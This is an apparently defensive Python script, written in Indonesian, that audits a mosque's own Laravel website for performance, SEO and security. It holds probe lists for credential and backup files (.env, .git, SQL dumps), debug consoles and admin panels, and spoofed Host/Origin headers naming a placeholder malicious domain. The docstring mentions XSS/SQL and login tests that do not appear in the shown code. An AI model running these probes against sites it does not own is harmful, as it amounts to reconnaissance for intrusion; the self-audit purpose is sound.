#!/usr/bin/env python3
"""
Pemeriksaan situs live Masjid Nurul Haqq: ketersediaan, performa, SEO, keamanan, dan tautan rusak.

Hanya memakai pustaka bawaan Python 3.9+, jadi bisa langsung dijalankan:

    python3 scripts/live_check.py                       # cek https://masjidnurulhaqq.com
    python3 scripts/live_check.py https://domain-lain.com
    python3 scripts/live_check.py --load 60 --concurrency 6 --json laporan.json

Uji beban dibuat ringan secara bawaan (30 permintaan, 5 paralel) agar tidak membebani shared hosting.

Bagian "keamanan lanjutan" mengirim input uji (XSS/SQL), metode HTTP tidak lazim, Host header palsu,
dan beberapa percobaan login salah dengan email acak yang tidak ada. Semuanya tidak merusak data,
tetapi tetap merupakan uji keamanan: JALANKAN HANYA TERHADAP SITUS MILIK ANDA SENDIRI.
Lewati dengan --basic, atau atur --login-attempts 0 / --skip-dns.
Kode keluar 1 bila ada pemeriksaan GAGAL, 0 bila semua lulus (peringatan tidak dihitung gagal).
"""

from __future__ import annotations

import argparse
import concurrent.futures as futures
import http.cookiejar
import re
import secrets
import gzip
import json
import socket
import ssl
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET
import zlib
from dataclasses import dataclass, field
from datetime import datetime, timezone
from html.parser import HTMLParser

USER_AGENT = "NurulHaqqLiveCheck/1.0 (+pemeriksaan situs oleh pengelola)"
TIMEOUT = 20

# Ambang batas performa (detik / byte).
TTFB_WARN, TTFB_FAIL = 0.8, 2.0
TOTAL_WARN, TOTAL_FAIL = 1.5, 4.0
PAGE_WEIGHT_WARN = 300 * 1024  # HTML setelah dekompresi
IMAGE_WARN = 500 * 1024

# Berkas yang tidak boleh bisa diunduh dari luar.
SENSITIVE_PATHS = [
    "/.env",
    "/.env.example",
    "/.git/HEAD",
    "/.git/config",
    "/composer.json",
    "/composer.lock",
    "/package.json",
    "/artisan",
    "/storage/logs/laravel.log",
    "/vendor/autoload.php",
    "/hot",
    "/build/manifest.json.bak",
    "/phpinfo.php",
    # Cadangan dan sisa deploy yang sering tertinggal di public_html.
    "/.env.bak",
    "/.env.save",
    "/.env.old",
    "/.env.production",
    "/index.php.bak",
    "/error_log",
    "/.htaccess",
    "/.DS_Store",
    "/web.config",
    "/db_nurulhaqq.sql",
    "/database.sql",
    "/backup.sql",
    "/backup.zip",
    "/public_html.zip",
    "/pengmas-masjid-nurul-haqq.zip",
    "/rrr.zip",
    "/dissablefunc.txt",
    "/info.php",
    "/test.php",
    # Berkas project Laravel bila folder project ikut terbuka dari web.
    "/../.env",
    "/nurulhaqq/.env",
    "/bootstrap/cache/config.php",
    "/config/database.php",
    "/database/database.sqlite",
    "/storage/framework/sessions/",
    "/routes/web.php",
    "/server.php",
]

# Alat debug/admin yang tidak boleh terbuka di produksi.
DEBUG_TOOL_PATHS = [
    "/_ignition/health-check",
    "/_ignition/execute-solution",
    "/_debugbar/open",
    "/telescope",
    "/horizon",
    "/log-viewer",
    "/phpmyadmin/",
    "/adminer.php",
    "/pma/",
]

# Folder yang tidak boleh menampilkan daftar isi ("Index of /").
LISTING_PATHS = ["/build/", "/build/assets/", "/images/", "/images/icons/", "/storage/", "/storage/galeri/", "/storage/laporan/", "/storage/ziswaf/"]

SECURITY_HEADERS = {
    "strict-transport-security": "HSTS (paksa HTTPS di browser)",
    "x-content-type-options": "X-Content-Type-Options: nosniff",
    "x-frame-options": "X-Frame-Options (cegah clickjacking)",
    "referrer-policy": "Referrer-Policy",
}

# Tanda halaman bocor dari lingkungan pengembangan atau mode debug.
LEAK_MARKERS = {
    "[::1]:5173": "file public/hot ikut terupload (aset dimuat dari Vite dev server)",
    "localhost:5173": "file public/hot ikut terupload (aset dimuat dari Vite dev server)",
    "127.0.0.1:5173": "file public/hot ikut terupload (aset dimuat dari Vite dev server)",
    "Whoops, looks like something went wrong": "APP_DEBUG menyala",
    "Stack trace:": "APP_DEBUG menyala (stack trace terlihat)",
    "vendor/laravel/framework": "jejak file internal Laravel terlihat",
    "SQLSTATE[": "pesan error database terlihat",
}


# --------------------------------------------------------------------------------------------
# Laporan
# --------------------------------------------------------------------------------------------

COLORS = {"PASS": "\033[32m", "WARN": "\033[33m", "FAIL": "\033[31m", "INFO": "\033[36m"}
RESET = "\033[0m"


@dataclass
class Report:
    results: list[dict] = field(default_factory=list)
    color: bool = True

    def add(self, section: str, level: str, message: str, detail: str = "") -> None:
        self.results.append({"section": section, "level": level, "message": message, "detail": detail})
        tag = f"{COLORS[level]}{level:4}{RESET}" if self.color else f"{level:4}"
        line = f"  [{tag}] {message}"
        if detail:
            line += f"\n         {detail}"
        print(line)

    def heading(self, title: str) -> None:
        print(f"\n\033[1m{title}\033[0m" if self.color else f"\n{title}")

    def count(self, level: str) -> int:
        return sum(1 for result in self.results if result["level"] == level)


# --------------------------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------------------------


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):  # noqa: D401 - jangan ikuti redirect
        return None


SSL_CONTEXT = ssl.create_default_context()
OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=SSL_CONTEXT))
OPENER_NO_REDIRECT = urllib.request.build_opener(urllib.request.HTTPSHandler(context=SSL_CONTEXT), NoRedirect)


@dataclass
class Response:
    url: str
    status: int
    headers: dict
    body: bytes
    raw_size: int
    ttfb: float
    total: float
    final_url: str
    error: str = ""

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")

    def header(self, name: str) -> str:
        return self.headers.get(name.lower(), "")


def fetch(
    url: str,
    *,
    follow: bool = True,
    method: str = "GET",
    encoding: str = "gzip, deflate",
    headers: dict | None = None,
    data: bytes | None = None,
    opener: urllib.request.OpenerDirector | None = None,
) -> Response:
    request = urllib.request.Request(url, method=method, data=data, headers={
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Accept-Encoding": encoding,
        "Accept-Language": "id,en;q=0.8",
        **(headers or {}),
    })
    opener = opener or (OPENER if follow else OPENER_NO_REDIRECT)
    start = time.perf_counter()

    try:
        handle = opener.open(request, timeout=TIMEOUT)
    except urllib.error.HTTPError as error:
        handle = error
    except Exception as error:  # jaringan putus, DNS, SSL, timeout
        return Response(url, 0, {}, b"", 0, 0.0, time.perf_counter() - start, url, error=str(error))

    ttfb = time.perf_counter() - start

    try:
        raw = handle.read() if method != "HEAD" else b""
    except Exception as error:
        raw, error_text = b"", str(error)
    else:
        error_text = ""

    total = time.perf_counter() - start
    headers = {key.lower(): value for key, value in handle.headers.items()}
    # Semua Set-Cookie disimpan (headers.items() hanya menyimpan satu per nama).
    headers["set-cookie-all"] = "\n".join(handle.headers.get_all("Set-Cookie") or [])
    body = raw

    content_encoding = headers.get("content-encoding", "")
    try:
        if content_encoding == "gzip":
            body = gzip.decompress(raw)
        elif content_encoding == "deflate":
            body = zlib.decompress(raw)
    except Exception:
        body = raw

    status = handle.status if hasattr(handle, "status") else handle.code
    final_url = handle.geturl() if hasattr(handle, "geturl") else url

    return Response(url, status, headers, body, len(raw), ttfb, total, final_url, error=error_text)


# --------------------------------------------------------------------------------------------
# HTML
# --------------------------------------------------------------------------------------------


class PageParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.title = ""
        self.meta: dict[str, str] = {}
        self.links: list[str] = []
        self.images: list[tuple[str, str | None]] = []
        self.scripts: list[str] = []
        self.styles: list[str] = []
        self.iframes: list[str] = []
        self.inline_scripts: list[str] = []
        self.forms: list[dict] = []
        self._form: dict | None = None
        self._in_script = False
        self.canonical = ""
        self.h1_count = 0
        self.lang = ""
        self.json_ld = False
        self._in_title = False

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            self._form = {"action": attrs.get("action") or "", "method": (attrs.get("method") or "get").lower(), "fields": []}
        elif tag in ("input", "textarea", "select") and self._form is not None and attrs.get("name"):
            self._form["fields"].append({"name": attrs["name"], "type": (attrs.get("type") or tag).lower(), "value": attrs.get("value") or ""})
        if tag == "script" and not attrs.get("src") and attrs.get("type") in (None, "", "module", "text/javascript", "application/ld+json"):
            self._in_script = True
        if tag == "html":
            self.lang = attrs.get("lang", "")
        elif tag == "title":
            self._in_title = True
        elif tag == "meta":
            key = attrs.get("name") or attrs.get("property")
            if key:
                self.meta[key.lower()] = attrs.get("content", "")
        elif tag == "link":
            rel = (attrs.get("rel") or "").lower()
            if rel == "canonical":
                self.canonical = attrs.get("href", "")
            elif rel == "stylesheet" and attrs.get("href"):
                self.styles.append(attrs["href"])
            elif rel in ("icon", "apple-touch-icon", "manifest") and attrs.get("href"):
                self.styles.append(attrs["href"])
        elif tag == "a" and attrs.get("href"):
            self.links.append(attrs["href"])
        elif tag == "img" and attrs.get("src"):
            self.images.append((attrs["src"], attrs.get("alt")))
        elif tag == "script":
            if attrs.get("src"):
                self.scripts.append(attrs["src"])
            if attrs.get("type") == "application/ld+json":
                self.json_ld = True
        elif tag == "iframe" and attrs.get("src"):
            self.iframes.append(attrs["src"])
        elif tag == "h1":
            self.h1_count += 1

    def handle_endtag(self, tag):
        if tag == "title":
            self._in_title = False
        elif tag == "script":
            self._in_script = False
        elif tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None

    def handle_data(self, data):
        if self._in_script and data.strip():
            self.inline_scripts.append(data)
        if self._in_title:
            self.title += data


def parse(html: str) -> PageParser:
    parser = PageParser()
    parser.feed(html)
    parser.title = " ".join(parser.title.split())
    return parser


# --------------------------------------------------------------------------------------------
# Pemeriksaan
# --------------------------------------------------------------------------------------------


def fmt_ms(seconds: float) -> str:
    return f"{seconds * 1000:.0f} ms"


def fmt_kb(size: int) -> str:
    return f"{size / 1024:.1f} KB"


def same_site(url: str, base: str) -> bool:
    return urllib.parse.urlsplit(url).netloc in ("", urllib.parse.urlsplit(base).netloc)


def normalize(url: str, page_url: str) -> str | None:
    if url.startswith(("mailto:", "tel:", "javascript:", "#", "data:", "sms:")):
        return None
    absolute = urllib.parse.urljoin(page_url, url)
    return urllib.parse.urldefrag(absolute)[0]


def check_tls_and_redirects(base: str, report: Report) -> None:
    report.heading("1. HTTPS, sertifikat, dan pengalihan")
    host = urllib.parse.urlsplit(base).hostname

    try:
        with socket.create_connection((host, 443), timeout=TIMEOUT) as sock:
            with SSL_CONTEXT.wrap_socket(sock, server_hostname=host) as tls:
                cert = tls.getpeercert()
                version = tls.version()
        expires = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
        days = (expires - datetime.now(timezone.utc)).days
        issuer = dict(item[0] for item in cert.get("issuer", ())).get("organizationName", "?")
        level = "PASS" if days > 14 else "WARN" if days > 0 else "FAIL"
        report.add("tls", level, f"Sertifikat SSL valid, berakhir {days} hari lagi ({expires:%d %b %Y})", f"Penerbit: {issuer} · {version}")
    except Exception as error:
        report.add("tls", "FAIL", "Sertifikat SSL bermasalah", str(error))

    http_url = base.replace("https://", "http://", 1)
    response = fetch(http_url, follow=False)
    location = response.header("location")
    if response.status in (301, 308) and location.startswith("https://"):
        report.add("redirect", "PASS", f"HTTP dialihkan permanen ke HTTPS ({response.status})", location)
    elif response.status in (302, 307) and location.startswith("https://"):
        report.add("redirect", "WARN", f"HTTP dialihkan ke HTTPS tapi sementara ({response.status}); sebaiknya 301", location)
    else:
        report.add("redirect", "FAIL", "HTTP tidak dialihkan ke HTTPS", f"status {response.status} {response.error}")

    www = base.replace("://", "://www.", 1) if "://www." not in base else base.replace("://www.", "://", 1)
    response = fetch(www, follow=False)
    location = response.header("location")
    if response.status in (301, 308):
        report.add("redirect", "PASS", f"{urllib.parse.urlsplit(www).netloc} dialihkan permanen", location)
    elif response.status in (302, 307):
        report.add("redirect", "WARN", f"{urllib.parse.urlsplit(www).netloc} dialihkan sementara ({response.status}); sebaiknya 301", location)
    elif response.status == 200:
        report.add("redirect", "WARN", f"{urllib.parse.urlsplit(www).netloc} tampil tanpa dialihkan (konten ganda di mesin pencari)")
    else:
        report.add("redirect", "INFO", f"{urllib.parse.urlsplit(www).netloc} tidak bisa dibuka", f"status {response.status} {response.error}")


def discover_pages(base: str, report: Report) -> list[str]:
    report.heading("2. robots.txt dan sitemap.xml")
    pages = [base + path for path in ("/", "/profil", "/jadwal-kegiatan", "/program-tpq", "/ziswaf", "/ziswaf/laporan", "/galeri", "/kontak")]

    robots = fetch(base + "/robots.txt")
    if robots.status == 200:
        has_sitemap = "sitemap:" in robots.text.lower()
        blocks_dashboard = "disallow: /dashboard" in robots.text.lower()
        report.add("seo", "PASS" if has_sitemap else "WARN", "robots.txt tersedia" + (" dan menunjuk ke sitemap" if has_sitemap else ", tapi tanpa baris Sitemap"))
        report.add("seo", "PASS" if blocks_dashboard else "WARN", "robots.txt " + ("memblokir /dashboard" if blocks_dashboard else "tidak memblokir /dashboard"))
    else:
        report.add("seo", "FAIL", "robots.txt tidak bisa dibuka", f"status {robots.status}")

    sitemap = fetch(base + "/sitemap.xml")
    if sitemap.status != 200:
        report.add("seo", "FAIL", "sitemap.xml tidak bisa dibuka", f"status {sitemap.status}")
        return pages

    try:
        root = ET.fromstring(sitemap.body)
        namespace = {"s": "http://www.sitemaps.org/schemas/sitemap/0.9"}
        locs = [loc.text.strip() for loc in root.findall(".//s:loc", namespace) if loc.text]
    except ET.ParseError as error:
        report.add("seo", "FAIL", "sitemap.xml bukan XML yang valid", str(error))
        return pages

    foreign = [loc for loc in locs if not loc.startswith(base)]
    report.add("seo", "PASS" if locs else "WARN", f"sitemap.xml valid, berisi {len(locs)} alamat")
    if foreign:
        report.add("seo", "FAIL", f"{len(foreign)} alamat di sitemap tidak memakai {base}", "Periksa APP_URL / domain: " + ", ".join(foreign[:3]))

    for loc in locs:
        if loc.rstrip("/") not in (page.rstrip("/") for page in pages):
            pages.append(loc)

    return pages


def check_pages(base: str, pages: list[str], report: Report) -> dict[str, PageParser]:
    report.heading("3. Halaman: status, kecepatan, ukuran, dan SEO")
    parsed: dict[str, PageParser] = {}
    titles: dict[str, str] = {}

    for url in pages:
        response = fetch(url)
        label = urllib.parse.urlsplit(url).path or "/"

        if response.status != 200:
            report.add("page", "FAIL", f"{label} → status {response.status}", response.error)
            continue

        timing = f"TTFB {fmt_ms(response.ttfb)} · total {fmt_ms(response.total)} · HTML {fmt_kb(len(response.body))} (terkirim {fmt_kb(response.raw_size)}, {response.header('content-encoding') or 'tanpa kompresi'})"
        level = "PASS"
        if response.ttfb > TTFB_FAIL or response.total > TOTAL_FAIL:
            level = "FAIL"
        elif response.ttfb > TTFB_WARN or response.total > TOTAL_WARN or len(response.body) > PAGE_WEIGHT_WARN:
            level = "WARN"
        report.add("performance", level, f"{label}", timing)

        html = response.text
        for marker, meaning in LEAK_MARKERS.items():
            if marker in html:
                report.add("security", "FAIL", f"{label}: {meaning}", f"ditemukan teks '{marker}'")

        page = parse(html)
        parsed[url] = page
        problems = []
        if not page.title:
            problems.append("tanpa <title>")
        elif len(page.title) > 65:
            problems.append(f"judul {len(page.title)} karakter (ideal ≤ 65)")
        description = page.meta.get("description", "")
        if not description:
            problems.append("tanpa meta description")
        elif not 50 <= len(description) <= 170:
            problems.append(f"description {len(description)} karakter (ideal 50–160)")
        if not page.canonical:
            problems.append("tanpa canonical")
        elif not page.canonical.startswith("https://"):
            problems.append(f"canonical bukan https: {page.canonical}")
        if not page.meta.get("og:image"):
            problems.append("tanpa og:image")
        if page.h1_count != 1:
            problems.append(f"{page.h1_count} tag <h1> (ideal 1)")
        if page.lang != "id":
            problems.append(f'lang="{page.lang}" (harusnya "id")')
        missing_alt = [src for src, alt in page.images if alt is None]
        if missing_alt:
            problems.append(f"{len(missing_alt)} gambar tanpa atribut alt")
        if "noindex" in page.meta.get("robots", ""):
            problems.append("meta robots noindex (halaman publik tidak akan diindeks!)")

        if "&amp;" in page.title or "&#039;" in page.title or "&quot;" in page.title:
            problems.append(f"judul ter-escape dua kali, tampil sebagai '{page.title}'")
        if page.title in titles.values():
            problems.append("judul sama dengan halaman lain")
        titles[url] = page.title

        report.add("seo", "WARN" if problems else "PASS", f"{label}: SEO {'perlu dicek' if problems else 'lengkap'}", "; ".join(problems) or page.title)

    home = parsed.get(base + "/")
    if home is not None:
        report.add("seo", "PASS" if home.json_ld else "WARN", "Beranda " + ("memiliki" if home.json_ld else "tidak memiliki") + " data terstruktur (JSON-LD)")

    return parsed


def check_assets(base: str, parsed: dict[str, PageParser], report: Report) -> None:
    report.heading("4. Aset: CSS, JS, ikon, dan gambar")
    assets: set[str] = set()
    images: set[str] = set()
    external_hosts: set[str] = set()

    for page_url, page in parsed.items():
        for src in page.styles + page.scripts:
            absolute = normalize(src, page_url)
            if absolute:
                (assets if same_site(absolute, base) else external_hosts).add(absolute if same_site(absolute, base) else urllib.parse.urlsplit(absolute).netloc)
        for src, _ in page.images:
            absolute = normalize(src, page_url)
            if absolute and same_site(absolute, base):
                images.add(absolute)
        for src in page.iframes:
            absolute = normalize(src, page_url)
            if absolute and not same_site(absolute, base):
                external_hosts.add(urllib.parse.urlsplit(absolute).netloc)

    def check_one(url: str) -> tuple[str, Response]:
        return url, fetch(url)

    with futures.ThreadPoolExecutor(max_workers=6) as pool:
        asset_results = list(pool.map(check_one, sorted(assets)))
        image_results = list(pool.map(check_one, sorted(images)))

    for url, response in asset_results:
        path = urllib.parse.urlsplit(url).path
        if response.status != 200:
            report.add("assets", "FAIL", f"{path} → status {response.status}", response.error)
            continue
        if not response.body:
            report.add("assets", "FAIL", f"{path} kosong (0 byte)", "berkas versi baru belum terupload ke server")
            continue
        cache = response.header("cache-control")
        encoding = response.header("content-encoding")
        notes = [fmt_kb(response.raw_size) + " terkirim", encoding or "tanpa kompresi", cache or "tanpa Cache-Control"]
        compressible = path.endswith((".css", ".js", ".webmanifest", ".svg"))
        level = "PASS"
        if compressible and not encoding:
            level = "WARN"
        if "/build/" in path and "max-age" not in cache and "immutable" not in cache and not response.header("expires"):
            level = "WARN"
            notes.append("aset build bisa di-cache lama (nama berkasnya ber-hash)")
        report.add("assets", level, path, " · ".join(notes))

    broken = [(url, response) for url, response in image_results if response.status != 200]
    heavy = [(url, response) for url, response in image_results if response.status == 200 and response.raw_size > IMAGE_WARN]
    storage_images = [url for url, _ in image_results if "/storage/" in url]

    report.add("images", "FAIL" if broken else "PASS", f"{len(image_results) - len(broken)} dari {len(image_results)} gambar terbuka")
    for url, response in broken[:15]:
        hint = " (cek storage link di halaman perawatan)" if "/storage/" in url else ""
        report.add("images", "FAIL", f"Gambar rusak: {urllib.parse.urlsplit(url).path}{hint}", f"status {response.status} {response.error}")
    if storage_images:
        ok = sum(1 for url, response in image_results if "/storage/" in url and response.status == 200)
        report.add("images", "PASS" if ok == len(storage_images) else "FAIL", f"Storage link: {ok}/{len(storage_images)} foto unggahan terbuka")
    for url, response in heavy[:10]:
        report.add("images", "WARN", f"Gambar besar {fmt_kb(response.raw_size)}: {urllib.parse.urlsplit(url).path}", "pertimbangkan diperkecil / WebP")

    if external_hosts:
        report.add("assets", "INFO", "Layanan luar yang dimuat", ", ".join(sorted(external_hosts)))


def check_links(base: str, parsed: dict[str, PageParser], report: Report, limit: int) -> None:
    report.heading("5. Tautan internal")
    links: dict[str, str] = {}
    for page_url, page in parsed.items():
        for href in page.links:
            absolute = normalize(href, page_url)
            if absolute and same_site(absolute, base) and absolute not in parsed and absolute not in links:
                links[absolute] = page_url

    targets = list(links)[:limit]

    with futures.ThreadPoolExecutor(max_workers=6) as pool:
        results = list(pool.map(lambda url: (url, fetch(url)), targets))

    broken = [(url, response) for url, response in results if response.status >= 400 or response.status == 0]
    report.add("links", "FAIL" if broken else "PASS", f"{len(results) - len(broken)} dari {len(results)} tautan internal tambahan berfungsi" + (f" (dibatasi {limit})" if len(links) > limit else ""))
    for url, response in broken[:15]:
        report.add("links", "FAIL", f"Tautan rusak: {urllib.parse.urlsplit(url).path}", f"status {response.status} · ditemukan di {urllib.parse.urlsplit(links[url]).path or '/'}")


def check_security(base: str, report: Report) -> None:
    report.heading("6. Keamanan")
    home = fetch(base + "/")

    for header, label in SECURITY_HEADERS.items():
        value = home.header(header)
        report.add("security", "PASS" if value else "WARN", f"{label}: {'ada' if value else 'tidak ada'}", value)

    if home.header("x-powered-by"):
        report.add("security", "WARN", "Header X-Powered-By memperlihatkan versi server", home.header("x-powered-by"))

    cookies = [value for key, value in home.headers.items() if key == "set-cookie"]
    raw_cookie = home.header("set-cookie")
    if raw_cookie:
        secure = "secure" in raw_cookie.lower()
        httponly = "httponly" in raw_cookie.lower()
        report.add("security", "PASS" if secure else "WARN", "Cookie sesi " + ("bertanda Secure" if secure else "tanpa tanda Secure (isi SESSION_SECURE_COOKIE=true)"))
        report.add("security", "PASS" if httponly else "WARN", "Cookie sesi " + ("bertanda HttpOnly" if httponly else "tanpa tanda HttpOnly"))
    del cookies

    def check_path(path: str) -> tuple[str, Response]:
        return path, fetch(base + path, follow=False)

    with futures.ThreadPoolExecutor(max_workers=6) as pool:
        results = list(pool.map(check_path, SENSITIVE_PATHS))

    exposed = []
    for path, response in results:
        if response.status == 200 and response.body:
            sample = response.text[:400]
            # Halaman HTML biasa (mis. 404 kustom dengan status 200) tidak dianggap bocor.
            if "<html" not in sample.lower() or "index of /" in sample.lower():
                exposed.append(path)
    if exposed:
        for path in exposed:
            report.add("security", "FAIL", f"Berkas sensitif bisa diunduh: {path}", "Pastikan hanya isi folder public yang ada di public_html")
    else:
        report.add("security", "PASS", f"{len(SENSITIVE_PATHS)} berkas sensitif (.env, .git, log, composer.json, hot, dll.) tidak bisa diunduh")

    missing = fetch(base + "/halaman-yang-tidak-ada-" + str(int(time.time())))
    leaked = [meaning for marker, meaning in LEAK_MARKERS.items() if marker in missing.text]
    if missing.status == 404 and not leaked:
        report.add("security", "PASS", "Halaman tidak ditemukan menjawab 404 tanpa detail error")
    else:
        report.add("security", "FAIL" if leaked else "WARN", f"Halaman tidak ditemukan menjawab {missing.status}", "; ".join(leaked))

    register = fetch(base + "/register", follow=False)
    report.add("security", "PASS" if register.status == 404 else "FAIL", f"Pendaftaran umum /register → {register.status}" + (" (ditutup)" if register.status == 404 else " (harus ditutup!)"))

    dashboard = fetch(base + "/dashboard", follow=False)
    to_login = dashboard.status in (301, 302, 303) and "/login" in dashboard.header("location")
    report.add("security", "PASS" if to_login else "FAIL", f"/dashboard tanpa login → {dashboard.status}" + (" ke halaman masuk" if to_login else ""), dashboard.header("location"))

    login = fetch(base + "/login")
    noindex = "noindex" in parse(login.text).meta.get("robots", "")
    report.add("security", "PASS" if login.status == 200 and noindex else "WARN", f"Halaman masuk {login.status}" + (", tidak diindeks mesin pencari" if noindex else ", tanpa noindex"))



# --------------------------------------------------------------------------------------------
# Keamanan lanjutan (tidak merusak; hanya untuk situs milik sendiri)
# --------------------------------------------------------------------------------------------


def tls_handshake(host: str, version: ssl.TLSVersion) -> tuple[bool, str]:
    """Coba jabat tangan hanya dengan satu versi TLS. Hasil: (berhasil, keterangan)."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    try:
        context.set_ciphers("ALL:@SECLEVEL=0")
        context.minimum_version = version
        context.maximum_version = version
    except (ValueError, ssl.SSLError) as error:
        return False, f"tidak bisa diuji dari mesin ini ({error})"
    try:
        with socket.create_connection((host, 443), timeout=TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=host) as tls:
                return True, tls.cipher()[0]
    except ssl.SSLError as error:
        return False, str(error.reason or error)
    except OSError as error:
        return False, str(error)


def check_tls_advanced(base: str, report: Report) -> None:
    report.heading("8a. TLS lanjutan")
    host = urllib.parse.urlsplit(base).hostname

    for version, label, should_work in (
        (ssl.TLSVersion.TLSv1, "TLS 1.0", False),
        (ssl.TLSVersion.TLSv1_1, "TLS 1.1", False),
        (ssl.TLSVersion.TLSv1_2, "TLS 1.2", True),
        (ssl.TLSVersion.TLSv1_3, "TLS 1.3", True),
    ):
        ok, detail = tls_handshake(host, version)
        if "tidak bisa diuji" in detail:
            report.add("tls", "INFO", f"{label}: {detail}")
        elif ok == should_work:
            report.add("tls", "PASS", f"{label} {'didukung' if ok else 'ditolak'}" + ("" if should_work else " (versi lama yang lemah)"), detail if ok else "")
        else:
            report.add("tls", "FAIL" if ok else "WARN", f"{label} {'masih didukung (lemah, minta hosting mematikannya)' if ok else 'tidak didukung'}", detail)

    try:
        with socket.create_connection((host, 443), timeout=TIMEOUT) as sock:
            with SSL_CONTEXT.wrap_socket(sock, server_hostname=host) as tls:
                cert = tls.getpeercert()
        names = [value for key, value in cert.get("subjectAltName", ()) if key == "DNS"]
        www = "www." + host if not host.startswith("www.") else host[4:]
        covered = any(name == www or (name.startswith("*.") and www.endswith(name[1:])) for name in names)
        report.add("tls", "PASS" if covered else "WARN", f"Sertifikat {'mencakup' if covered else 'tidak mencakup'} {www}", ", ".join(names))
    except Exception as error:
        report.add("tls", "WARN", "Nama di sertifikat tidak bisa dibaca", str(error))

    hsts = fetch(base + "/").header("strict-transport-security")
    if hsts:
        match = re.search(r"max-age=(\d+)", hsts)
        age = int(match.group(1)) if match else 0
        report.add("tls", "PASS" if age >= 15552000 else "WARN", f"HSTS max-age {age // 86400} hari" + ("" if age >= 15552000 else " (disarankan ≥ 180 hari)"), hsts)


def check_http_hardening(base: str, report: Report) -> None:
    report.heading("8b. Metode HTTP, CORS, Host header, dan daftar folder")

    trace = fetch(base + "/", method="TRACE", follow=False)
    report.add("hardening", "PASS" if trace.status in (400, 403, 405, 501) or trace.status == 0 else "FAIL",
               f"Metode TRACE → {trace.status or 'ditolak'}", "TRACE harus ditolak (cegah Cross-Site Tracing)" if trace.status == 200 else "")

    for method in ("PUT", "DELETE", "PATCH"):
        response = fetch(base + "/", method=method, follow=False, data=b"")
        report.add("hardening", "PASS" if response.status in (403, 405, 419, 501) else "WARN", f"Metode {method} ke Beranda → {response.status}")

    evil = "https://situs-jahat.example"
    cors = fetch(base + "/", headers={"Origin": evil})
    allow_origin = cors.header("access-control-allow-origin")
    allow_credentials = cors.header("access-control-allow-credentials").lower() == "true"
    if allow_origin in (evil, "*") and allow_credentials:
        report.add("hardening", "FAIL", "CORS mengizinkan situs lain membaca halaman beserta cookie login", f"Allow-Origin: {allow_origin}")
    elif allow_origin == evil:
        report.add("hardening", "WARN", "CORS memantulkan Origin dari situs lain", allow_origin)
    else:
        report.add("hardening", "PASS", "CORS tidak membuka akses untuk situs lain", allow_origin or "tidak ada header CORS")

    injected = fetch(base + "/", headers={"Host": "situs-jahat.example"}, follow=False)
    poisoned = "situs-jahat.example" in injected.text or "situs-jahat.example" in injected.header("location")
    if injected.status == 200 and poisoned:
        report.add("hardening", "WARN", "Host header palsu dipakai untuk membuat tautan (Host header injection)",
                   "Server menerima domain apa pun; batasi dengan TrustHosts / konfigurasi hosting")
    else:
        report.add("hardening", "PASS", f"Host header palsu tidak dipantulkan ke halaman (status {injected.status or 'ditolak'})")

    forwarded = fetch(base + "/", headers={"X-Forwarded-Host": "situs-jahat.example"})
    report.add("hardening", "FAIL" if "situs-jahat.example" in forwarded.text else "PASS",
               "X-Forwarded-Host palsu " + ("dipakai untuk tautan (cache poisoning)" if "situs-jahat.example" in forwarded.text else "diabaikan"))

    def listing(path: str) -> tuple[str, Response]:
        return path, fetch(base + path, follow=False)

    with futures.ThreadPoolExecutor(max_workers=6) as pool:
        results = list(pool.map(listing, LISTING_PATHS))
    opened = [path for path, response in results if response.status == 200 and ("index of /" in response.text.lower() or "parent directory" in response.text.lower())]
    report.add("hardening", "FAIL" if opened else "PASS",
               "Daftar isi folder " + ("terbuka: " + ", ".join(opened) if opened else f"tertutup di {len(LISTING_PATHS)} folder (build, images, storage)"),
               "Tambahkan 'Options -Indexes' di .htaccess" if opened else "")

    with futures.ThreadPoolExecutor(max_workers=6) as pool:
        tools = list(pool.map(lambda path: (path, fetch(base + path, follow=False)), DEBUG_TOOL_PATHS))
    exposed = [f"{path} ({response.status})" for path, response in tools if response.status == 200]
    report.add("hardening", "FAIL" if exposed else "PASS",
               "Alat debug/admin " + ("terbuka: " + ", ".join(exposed) if exposed else "(Ignition, Debugbar, Telescope, phpMyAdmin, Adminer) tidak terbuka"))

    security_txt = fetch(base + "/.well-known/security.txt", follow=False)
    report.add("hardening", "INFO", "security.txt " + ("tersedia" if security_txt.status == 200 else "tidak ada (opsional, kontak untuk pelapor celah keamanan)"))


def check_cookies_and_headers(base: str, report: Report) -> None:
    report.heading("8c. Cookie, CSP, dan kebocoran informasi")
    login = fetch(base + "/login")
    cookies = [line for line in login.header("set-cookie-all").split("\n") if line]

    for cookie in cookies:
        name = cookie.split("=", 1)[0]
        flags = cookie.lower()
        missing = [flag for flag in ("secure", "samesite") if flag not in flags]
        if name.lower().endswith("session") and "httponly" not in flags:
            missing.append("httponly")
        report.add("cookies", "WARN" if missing else "PASS", f"Cookie {name}: " + ("tanpa " + ", ".join(missing) if missing else "Secure, SameSite" + (", HttpOnly" if "httponly" in flags else "")))
    if not cookies:
        report.add("cookies", "INFO", "Halaman masuk tidak memasang cookie")

    csp = login.header("content-security-policy") or fetch(base + "/").header("content-security-policy")
    protective = any(directive in csp for directive in ("default-src", "script-src", "frame-ancestors"))
    if protective:
        report.add("headers", "PASS", "Content-Security-Policy membatasi sumber skrip/frame", csp[:160])
    elif csp:
        report.add("headers", "WARN", "Content-Security-Policy ada tapi belum membatasi skrip/frame", csp[:160])
    else:
        report.add("headers", "WARN", "Content-Security-Policy belum ada (lapisan tambahan terhadap XSS)")
    permissions = fetch(base + "/").header("permissions-policy")
    report.add("headers", "PASS" if permissions else "INFO", "Permissions-Policy " + ("ada" if permissions else "belum ada (opsional)"))

